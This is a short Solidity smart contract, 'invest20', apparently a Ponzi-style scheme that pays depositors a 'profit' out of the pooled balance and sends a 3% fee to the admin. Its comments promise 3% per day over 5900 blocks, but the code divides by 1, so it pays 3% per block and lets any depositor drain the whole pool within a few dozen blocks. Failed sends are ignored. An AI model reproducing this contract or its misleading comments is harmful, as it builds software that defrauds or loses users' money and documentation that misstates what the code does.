pragma solidity ^0.4.25;

contract invest20 {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;
    
    address public owner;
    address public adminAddr;
    
    modifier onlyOwner {if (msg.sender == owner) _;}
    
    constructor() public {
        owner = msg.sender;
        adminAddr = msg.sender;
    }

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 3% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 3 / 100 * (block.number - atBlock[msg.sender]) / 1;
            
            if (amount >= address(this).balance){
                //amount = address(this).balance - 10000000000000000;
                amount = address(this).balance;
            }
            
            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
        
        //project fee 3%
        if (msg.value > 0){
            adminAddr.send(msg.value * 3 / 100);
        }
    }
    
    function investorBaseInfo(address addr) public view returns(uint) {
        return (
          invested[addr]
        );
    }
    
    function balance() public view returns(uint){
        return address(this).balance;
    }
    
    function mybalance(address addr) public view returns(uint){
        return (invested[addr] * 3 / 100 * (block.number - atBlock[addr]) / 1);
    }
    
}